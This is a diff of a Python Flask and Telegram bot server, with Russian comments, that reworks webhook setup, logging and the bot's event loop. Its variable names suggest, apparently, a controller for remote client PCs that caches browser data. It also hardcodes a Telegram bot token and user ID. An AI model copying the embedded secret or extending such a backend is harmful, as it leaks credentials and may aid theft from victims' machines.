@@ -4,7 +4,7 @@ import requests
 import threading
 import time
 import asyncio
-import json  # Добавлен импорт json
+import json
 from flask import Flask, request, jsonify
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
@@ -18,12 +18,12 @@ from telegram.ext import (
 
 app = Flask(__name__)
 
-# ===== КОНФИГУРАЦИЯ (ЗАМЕНИТЕ ЭТИ ЗНАЧЕНИЯ!) =====
+# ===== КОНФИГУРАЦИЯ =====
 BOT_TOKEN = "8004274832:AAG2gDVDp_dQLllcVBIYVB-0WTJ1Ts4CtCU"
 AUTHORIZED_USERS = [6330090175]
-SERVER_URL = "https://mypc-wk16.onrender.com"  # Убрано дублирование https://
+SERVER_URL = "https://mypc-wk16.onrender.com"  # Убедитесь что URL правильный!
 PORT = 10000
-# ================================================
+# ========================
 
 CLIENTS = {}
 BROWSER_DATA_CACHE = {}
@@ -34,6 +34,7 @@ logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO
 )
+logger = logging.getLogger(__name__)
 
 # Инициализация приложения бота
 bot_app = Application.builder().token(BOT_TOKEN).build()
@@ -319,44 +320,56 @@ def register_handlers():
     bot_app.add_handler(CallbackQueryHandler(handle_command))
     bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
 
-# Веб-хук обработчик (синхронная версия)
+# Веб-хук обработчик
 @app.post(f'/{BOT_TOKEN}')
 def webhook():
     json_data = request.get_json()
     update = Update.de_json(json_data, bot_app.bot)
-    bot_app.update_queue.put(update)  # Используем потокобезопасную очередь
+    logger.info(f"Received update: {update.update_id}")
+    bot_app.update_queue.put(update)
     return '', 200
 
 # Установка веб-хука при запуске
 async def set_webhook():
-    await bot_app.bot.set_webhook(f"{SERVER_URL}/{BOT_TOKEN}")
+    webhook_url = f"{SERVER_URL}/{BOT_TOKEN}"
+    try:
+        await bot_app.bot.set_webhook(webhook_url)
+        logger.info(f"Webhook установлен: {webhook_url}")
+    except Exception as e:
+        logger.error(f"Ошибка установки webhook: {e}")
 
 def run_bot():
     register_handlers()
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     loop.run_until_complete(set_webhook())
-    logging.info(f"Webhook установлен: {SERVER_URL}/{BOT_TOKEN}")
     
-    # Запуск бота в фоновом потоке
-    async def bot_main():
-        await bot_app.initialize()
-        await bot_app.start()
-        await bot_app.idle()
-    
+    # Запуск бота в фоновом потоке с обработкой обновлений
     def start_bot():
-        asyncio.run(bot_main())
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        try:
+            # КРИТИЧЕСКИ ВАЖНО: запускаем процессор обновлений
+            loop.run_until_complete(bot_app.initialize())
+            loop.run_until_complete(bot_app.start())
+            logger.info("Бот запущен и готов к обработке обновлений")
+            loop.run_forever()  # Бесконечный цикл для обработки обновлений
+        except Exception as e:
+            logger.exception(f"Fatal error in bot thread: {e}")
+        finally:
+            loop.close()
     
     bot_thread = threading.Thread(target=start_bot, daemon=True)
     bot_thread.start()
-    logging.info("Бот запущен в фоновом потоке")
+    logger.info("Поток обработки бота запущен")
 
 @app.route('/')
 def index():
     return "Сервер запущен. Ожидание команд."
 
 if __name__ == "__main__":
-    logging.info("Сервер запускается...")
+    logger.info("Сервер запускается...")
     
     # Запуск очистки неактивных клиентов
     threading.Thread(target=cleanup_clients, daemon=True).start()
@@ -365,4 +378,4 @@ if __name__ == "__main__":
     run_bot()
     
     # Запуск Flask сервера
-    app.run(host='0.0.0.0', port=PORT)
+    app.run(host='0.0.0.0', port=PORT, debug=False)  # Отключите debug в продакшене
